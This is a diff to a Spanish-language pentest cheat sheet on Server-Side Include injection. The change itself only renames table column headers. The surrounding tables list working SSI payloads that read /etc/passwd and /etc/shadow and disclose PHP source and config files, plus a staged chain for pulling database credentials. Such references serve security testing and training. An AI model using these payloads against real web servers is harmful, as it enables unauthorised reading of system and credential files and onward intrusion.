@@ -22,7 +22,7 @@ linked:
 
 ## `#include virtual` (URL-Relative)
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Include relative URL | `<!--#include virtual="/admin/config.php" -->` | Path relativo a webroot. |
 | Include other .shtml | `<!--#include virtual="/another.shtml" -->` | Recursive SSI. |
@@ -42,7 +42,7 @@ ___
 
 ## `#include file` (Filesystem-Relative)
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Read file absolute path | `<!--#include file="/etc/passwd" -->` | Direct file read. |
 | Read shadow (root only) | `<!--#include file="/etc/shadow" -->` | Permissions matter. |
@@ -77,7 +77,7 @@ ___
 
 ## LFI Chain via SSI
 
-| **Workflow** | **Step** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Stage 1: Source disclosure | `<!--#include file="/var/www/index.php" -->` | Read PHP source. |
 | Stage 2: Identify creds | Read app config con DB password | Standard. |
